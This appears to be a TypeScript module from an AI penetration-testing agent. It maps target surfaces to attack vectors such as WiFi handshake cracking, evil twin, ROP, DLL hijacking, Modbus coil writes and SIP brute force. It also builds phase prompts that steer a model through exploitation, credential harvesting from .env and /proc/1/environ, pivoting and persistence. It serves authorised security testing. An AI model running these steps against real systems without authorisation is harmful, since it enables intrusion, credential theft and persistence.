  // --- Smart Contracts ---
  {
    pattern: /smart.?contract|solidity|ethereum|defi|flash.?loan|reentrancy|evm|web3|blockchain/i,
    vectors: [
      { pillar: 2, category: "Reentrancy", test: "Call a function that sends ETH before updating state — can a malicious receive() callback re-enter and drain funds?" },
      { pillar: 2, category: "Flash Loan Attack", test: "Borrow massive amount, manipulate oracle/pool price, profit, repay in one transaction — test with Foundry fork" },
      { pillar: 2, category: "Oracle Manipulation", test: "Is the price feed from a single DEX pool? Manipulate spot price with large swap before the vulnerable call" },
      { pillar: 2, category: "Access Control", test: "Can arbitrary addresses call owner-only functions? Is tx.origin used instead of msg.sender for auth?" },
    ],
  },
  // --- Wireless ---
  {
    pattern: /wireless|wifi|wpa|wep|bluetooth|ble|deauth|evil.?twin|antenna|aircrack/i,
    vectors: [
      { pillar: 2, category: "WPA2 Handshake Capture", test: "airodump-ng + deauth → capture 4-way handshake → hashcat -m 22000 — if password cracks, WiFi compromised" },
      { pillar: 2, category: "Evil Twin", test: "Clone SSID with stronger signal, force deauth, capture credentials on fake captive portal — test with hostapd-mana" },
      { pillar: 2, category: "BLE Sniffing", test: "Use Ubertooth or nRF52840 to sniff BLE pairing — if static passkey or Just Works, intercept communications" },
      { pillar: 1, category: "Inversion", test: "WPA3 SAE: test Dragonblood side-channel attacks. WPA-Enterprise: test PEAP without server cert validation (evil RADIUS)" },
    ],
  },
  // --- Binary / Reverse Engineering ---
  {
    pattern: /binary|reverse.?eng|ghidra|ida|radare|disassemb|exploit.?dev|buffer|overflow|rop|shellcode/i,
    vectors: [
      { pillar: 2, category: "Buffer Overflow", test: "Fuzz inputs with pattern_create — if crash, check EIP/RIP overwrite, map offsets, build ROP chain or ret2libc" },
      { pillar: 2, category: "Format String", test: "Send %x.%x.%x.%x in string inputs — if stack values leak, format string vulnerability confirmed → arbitrary read/write" },
      { pillar: 2, category: "Hardcoded Secrets", test: "strings + grep -i password/key/token on the binary — check .rodata and .data sections for embedded credentials" },
      { pillar: 1, category: "Inversion", test: "NX enabled? Use ROP. ASLR? Leak address first. Stack canary? Overwrite only the return address via format string" },
    ],
  },
  // --- Thick Client ---
  {
    pattern: /thick.?client|desktop.?app|electron|winforms|wpf|swing|qt|native.?app/i,
    vectors: [
      { pillar: 2, category: "Local Proxy Intercept", test: "Route traffic through Burp/mitmproxy — does the app validate TLS certs? Pin certificates? Fall back to HTTP?" },
      { pillar: 2, category: "Local Storage Secrets", test: "Check AppData, LocalStorage, registry, config files for plaintext credentials, tokens, API keys" },
      { pillar: 2, category: "DLL Hijacking", test: "Place malicious DLL in app directory matching a missing import — if loaded, code execution via search order hijacking" },
      { pillar: 2, category: "Memory Inspection", test: "Attach debugger, search process memory for credentials, decryption keys, session tokens in plaintext" },
    ],
  },
  // --- Crypto / TLS ---
  {
    pattern: /crypto|tls|ssl|cipher|certificate|hsts|pinning|encryption|hash|bcrypt|sha|aes/i,
    vectors: [
      { pillar: 2, category: "Weak Cipher Suites", test: "testssl.sh or sslscan — flag CBC, RC4, 3DES, export ciphers, TLS 1.0/1.1, missing PFS" },
      { pillar: 2, category: "Certificate Issues", test: "Check expiry, hostname mismatch, self-signed, weak key (RSA <2048), missing OCSP stapling, bad chain" },
      { pillar: 2, category: "Weak Hashing", test: "If passwords use MD5/SHA1/unsalted — crack with hashcat/john. If JWT uses HS256 with weak secret — brute-force" },
      { pillar: 1, category: "Inversion", test: "HSTS deployed? Check for missing includeSubdomains or max-age too low. Certificate pinning? Check for pin rotation/backup" },
    ],
  },
  // --- GraphQL ---
  {
    pattern: /graphql|gql|introspect|mutation|subscription|schema/i,
    vectors: [
      { pillar: 2, category: "Introspection Leak", test: "Send {__schema{types{name,fields{name}}}} — if full schema returns, map all types, queries, mutations including internal ones" },
      { pillar: 2, category: "Authorization Bypass", test: "Query a field your role shouldn't access — does the resolver enforce auth per field, or only at the query level?" },
      { pillar: 2, category: "Nested Query DoS", test: "Send deeply nested query (user{friends{friends{friends...}}}) — if no depth/complexity limit, server exhausts resources" },
      { pillar: 2, category: "Batch Attack", test: "Send array of queries [{query1},{query2},...] — does rate limiting apply per batch or per query inside the batch?" },
    ],
  },
  // --- SCADA / ICS / OT ---
  {
    pattern: /scada|ics|ot|plc|modbus|dnp3|bacnet|industrial|hmi|dcs|opcua/i,
    vectors: [
      { pillar: 2, category: "Unauthenticated Protocol", test: "Modbus TCP has no auth by default — read holding registers, write coils without credentials to test segmentation" },
      { pillar: 2, category: "HMI Web Interface", test: "Many HMIs expose HTTP interfaces with default creds or no auth — test for command injection in parameter fields" },
      { pillar: 2, category: "Network Segmentation", test: "Can IT network reach OT network? Probe from compromised IT host with Modbus/BACnet scanner to test isolation" },
      { pillar: 1, category: "Inversion", test: "Even 'air-gapped' networks have USB, maintenance laptops, cellular modems — verify physical isolation claims" },
    ],
  },
  // --- VoIP ---
  {
    pattern: /voip|sip|rtp|pbx|asterisk|freepbx|telephony|ivr/i,
    vectors: [
      { pillar: 2, category: "SIP Enumeration", test: "svmap/svwar to discover SIP devices and enumerate extensions — if extensions list, brute-force credentials with svcrack" },
      { pillar: 2, category: "RTP Interception", test: "If RTP unencrypted (no SRTP) — capture with Wireshark, decode with sox — if voice plays back, calls are interceptable" },
      { pillar: 2, category: "Toll Fraud", test: "Register as a valid extension, attempt outbound calls to premium numbers — if connected, PBX allows unauthorized calling" },
    ],
  },
  // --- Forensics ---
  {
    pattern: /forensic|memory.?dump|volatility|disk.?image|pcap|artifact|evidence|timeline/i,
    vectors: [
      { pillar: 2, category: "Memory Analysis", test: "volatility imageinfo → pslist, netscan, hashdump, malfind — extract running processes, network connections, injected code, credentials" },
      { pillar: 2, category: "Disk Timeline", test: "Build MFT/journal timeline, check $UsnJrnl, prefetch, shimcache, amcache — reconstruct execution and file access history" },
      { pillar: 2, category: "Network Forensics", test: "pcap analysis: extract files with NetworkMiner, follow TCP streams, check DNS for C2 domains, extract credentials from cleartext protocols" },
      { pillar: 1, category: "Anti-Forensics Check", test: "Look for timestomping (MFT vs $SI mismatch), log gaps, wiped event logs, Mimikatz artifacts in memory" },
    ],
  },
];

/**
 * Match counter-logic vectors to a surface based on its label.
 *
 * Returns the top N most relevant vectors, deduplicated by category.
 */
export function counterLogicFor(
  surfaceLabel: string,
  limit = 6,
): CounterLogicVector[] {
  const matched: CounterLogicVector[] = [];
  for (const entry of SURFACE_VECTORS) {
    if (entry.pattern.test(surfaceLabel)) {
      matched.push(...entry.vectors);
    }
  }
  // Deduplicate by category, keep first match
  const seen = new Set<string>();
  const unique: CounterLogicVector[] = [];
  for (const v of matched) {
    if (!seen.has(v.category)) {
      seen.add(v.category);
      unique.push(v);
    }
  }
  return unique.slice(0, limit);
}

// ---------------------------------------------------------------------------
// Counter-Logic Gauntlet — permanent adversarial reasoning protocol
// ---------------------------------------------------------------------------
//
// Faithfully integrated from the Counter-Logic Protocol skill.
// "Invert, always invert." — Carl Jacobi
//
// This is NOT a list of attack vectors (those are SURFACE_VECTORS above).
// This is a cognitive protocol that forces the model to abandon confirmation
// bias, invert assumptions, and attack its own reasoning at every step.
//
// 4 Pillars: Inversion/Pre-Mortem → Offensive Logic → Client/Mobile Entropy → 2nd-Order/Cobra Effects
// 4-Step Gauntlet: Assumption Audit → Malicious Persona → Blast-Radius Trace → Hardening Verdict

export interface GauntletContext {
  currentPhase: OffensivePhase;
  hasConfirmedFindings: boolean;
  hasActiveHypothesis: boolean;
  surfacesTested: number;
  surfacesTotal: number;
  lastToolUsed?: string;
}

export function counterLogicGauntlet(ctx: GauntletContext): string {
  const lines: string[] = [
    "COUNTER-LOGIC PROTOCOL — Apply to every action, every conclusion, every tool result.",
    '"Invert, always invert: What if we focus on what we want to avoid rather than what we want to achieve?"',
  ];

  // ── Pillar 1: Inversion & Pre-Mortem (always) ─────────────────────
  lines.push(
    "PILLAR 1 — INVERSION & PRE-MORTEM:",
    "  Unstated Trust: What is assumed never null, never empty, never delayed, never hostile?",
    "  Happy-Path Deception: Does this only work if every call succeeds in <200ms with valid HTTP 200?",
    "  Out-of-Order: What if step 3 completes before step 2? What if the webhook arrives before the DB commits?",
    "  Infinite Resource Illusion: What happens at 100% capacity — disk, RAM, connections, rate limits?",
  );

  // ── Pillar 2: Offensive Business Logic (phase-adapted) ────────────
  if (ctx.currentPhase === "recon" || ctx.currentPhase === "enumerate") {
    lines.push(
      "PILLAR 2 — OFFENSIVE LOGIC (recon/enumerate):",
      "  You're gathering info — are you missing the attack surface in plain sight?",
      "  JS bundles: grep for /api/, fetch(, hardcoded keys, source maps (.map files), debug code",
      "  Traffic: capture all requests during normal usage — find undocumented routes, debug endpoints, internal APIs",
      "  Errors: 404 pages leak framework fingerprints, stack traces leak file paths, headers leak internal hostnames",
      "  Cookies: decode session cookies (JWT, base64, serialized objects) — what is the server trusting the client to hold?",
    );
  } else if (ctx.currentPhase === "exploit") {
    lines.push(
      "PILLAR 2 — OFFENSIVE LOGIC (exploit):",
      "  State-Machine Skips: Can you hit /checkout/confirm without /checkout/validate? Can CANCELLED → ACTIVE via PATCH?",
      "  TOCTOU: Send 10 concurrent requests — does it transfer/claim/withdraw once or ten times? Is SELECT...UPDATE atomic?",
      "  Parameter Tampering: Can quantity be -1? Can price be 0? Can items be []? Does float rounding accumulate errors?",
      "  Callback Forgery: Does the backend trust the client's claim of payment success, or verify server-to-server?",
      "  IDOR: Does /tenant/A/orders/999 verify order 999 belongs to tenant A, or just findById(999)?",
    );
  } else if (ctx.currentPhase === "post-exploit") {
    lines.push(
      "PILLAR 2 — OFFENSIVE LOGIC (post-exploit):",
      "  Credentials: What secrets are in memory, disk, env, config files, .env, /proc/1/environ?",
      "  Trust: What internal services trust this host? Can you pivot user→admin, container→host, tenant→tenant?",
      "  Persistence: Can you establish cron, systemd, registry, or startup script persistence?",
    );
  } else {
    lines.push(
      "PILLAR 2 — OFFENSIVE LOGIC:",
      "  Greedy Attacker: How do I duplicate value, skip paying, access competitor's data, escalate privileges?",
      "  Every endpoint: can the step be skipped? Can the state be rolled back? Does the server re-validate what the client sends?",
    );
  }

  // ── Pillar 3: Mobile & Client-Side Entropy (always) ───────────────
  lines.push(
    "PILLAR 3 — CLIENT & MOBILE ENTROPY:",
    "  Rapid Multi-Tap: 5 taps in 100ms on submit — 5 transactions or 1? Client debounce only or server-enforced?",
    "  Clock Manipulation: Does trial/token/paywall rely on DateTime.now()? Change device clock and check.",
    "  Network Flap: Drop network between socket write and server response — is state consistent on reconnect?",
    "  Back-Gesture During Mutation: Swipe back while payment/migration in progress — what happens?",
    "  Client-Side Auth: Are route guards and role checks only in JS/Flutter? Call the API directly to find out.",
  );

  // ── Pillar 4: 2nd-Order & Cobra Effects ───────────────────────────
  if (ctx.hasConfirmedFindings) {
    lines.push(
      "PILLAR 4 — 2ND-ORDER & COBRA (you have confirmed findings):",
      "  A confirmed XSS chains with CSRF. A confirmed SSRF reaches cloud metadata. A confirmed SQLi reads files.",
      "  A confirmed IDOR on one endpoint means the same pattern exists on every similar endpoint.",
      "  Don't collect isolated bugs — build attack chains. What does this finding unlock?",
      "  Cobra check: does your 'fix' for a blocked path create a worse opening elsewhere?",
    );
  } else {
    lines.push(
      "PILLAR 4 — 2ND-ORDER & COBRA:",
      "  If you mark a surface 'clean' — did you test from every context (auth, unauth, different roles, different HTTP methods)?",
      "  Cobra: a short timeout causes retry storms. A cache saves RAM but serves stale data. Rate-limiting by IP blocks NAT users.",
      "  What would a tester who proved you wrong do differently?",
    );
  }

  // ── The 4-Step Gauntlet (always) ──────────────────────────────────
  lines.push(
    "THE 4-STEP GAUNTLET (run on every action):",
    "  1. ASSUMPTION AUDIT: Name your 3 strongest assumptions about this target right now.",
    "  2. MALICIOUS PERSONA: Adopt one — The Greedy Attacker (duplicate value, skip paying, access others' data) | The Chaotic Environment (80% packet loss, 45min clock drift, disk read-only, 99% memory) | The Frantic User (double-clicking everything, hammering back, switching apps mid-save).",
    "  3. BLAST-RADIUS TRACE: If this component fails, what downstream services, tables, views suffer collateral? Graceful degradation or full plane crash?",
    "  4. HARDENING VERDICT: Prescribe exact defense — atomic DB constraints, idempotency keys, state-machine guards, client debounce.",
  );

  // ── Quick Reference Checklist (always) ────────────────────────────
  lines.push(
    "CHECKLIST: Can any step be skipped or called out of order? Can two identical actions execute concurrently and succeed twice? Are monetary/quantity values checked against <=0 and NaN? Does offline state resolve deterministically? Does a timeout trigger retry storms? Are secrets taken from request bodies instead of verified tokens? Is state clean if user navigates away mid-operation?",
  );

  return lines.join("\n");
}

// ---------------------------------------------------------------------------
// Phase directive — the main export consumed by directives()
// ---------------------------------------------------------------------------

export interface PhaseDirective {
  phase: OffensivePhase;
  priority: "mandatory" | "recommended";
  text: string;
}

/**
 * Produce a phase-aware directive.
 *
 * Returns null when the model is making progress in the right phase.
 * Returns a mandatory directive when it should transition.
 * Returns recommended counter-logic vectors when in exploit phase.
 */
export function phaseDirective(input: PhaseInput, surfaceLabels: readonly string[]): PhaseDirective | null {
  const phase = detectPhase(input);

  // Backtrack fires before anything else: detectPhase already forced
  // "enumerate" when consecutiveExploitFailures >= 3, but the directive
  // must still tell the model why.
  if (input.consecutiveExploitFailures >= 3) {
    return {
      phase: "enumerate",
      priority: "mandatory",
      text: `BACKTRACK: 3 consecutive exploit failures. Return to enumeration: gather more information before retrying. Different tool, different angle.`,
    };
  }

  const transition = transitionCheck(phase, input);

  // Recon → enumerate transition: mandatory after enough observations
  if (phase === "recon" && transition && input.observationCount >= 10) {
    return {
      phase: "enumerate",
      priority: "mandatory",
      text: `PHASE TRANSITION: ${transition.reason}`,
    };
  }

  // Recon → enumerate: recommended when surfaces exist but model stays in recon
  if (phase === "recon" && transition) {
    return {
      phase: "enumerate",
      priority: "recommended",
      text: `Phase transition available: ${transition.reason}`,
    };
  }

  // Enumerate → exploit transition
  if (phase === "enumerate" && transition) {
    const vectors = surfaceLabels
      .flatMap((label) => counterLogicFor(label, 2))
      .slice(0, 6);
    const vectorText = vectors.length
      ? "\nCounter-logic vectors to test:\n" +
        vectors.map((v) => `  - [P${v.pillar} ${v.category}] ${v.test}`).join("\n")
      : "";
    return {
      phase: "exploit",
      priority: input.observationCount >= 15 ? "mandatory" : "recommended",
      text: `PHASE TRANSITION: ${transition.reason}${vectorText}`,
    };
  }

  // Exploit → post-exploit transition (or backtrack)
  if (phase === "exploit" && transition) {
    return {
      phase: transition.targetPhase,
      priority:
        transition.targetPhase === "enumerate" ? "mandatory" : "recommended",
      text: `PHASE TRANSITION: ${transition.reason}`,
    };
  }

  // Post-exploit → report transition
  if (phase === "post-exploit" && transition) {
    return {
      phase: transition.targetPhase,
      priority: "recommended",
      text: `PHASE TRANSITION: ${transition.reason}`,
    };
  }

  // In exploit phase: inject counter-logic vectors for untested surfaces
  if (phase === "exploit" && input.surfacesUntested > 0) {
    const vectors = surfaceLabels
      .flatMap((label) => counterLogicFor(label, 2))
      .slice(0, 4);
    if (vectors.length) {
      return {
        phase: "exploit",
        priority: "recommended",
        text: `Counter-logic vectors for untested surfaces:\n` +
          vectors.map((v) => `  - [P${v.pillar} ${v.category}] ${v.test}`).join("\n"),
      };
    }
  }

  return null;
}
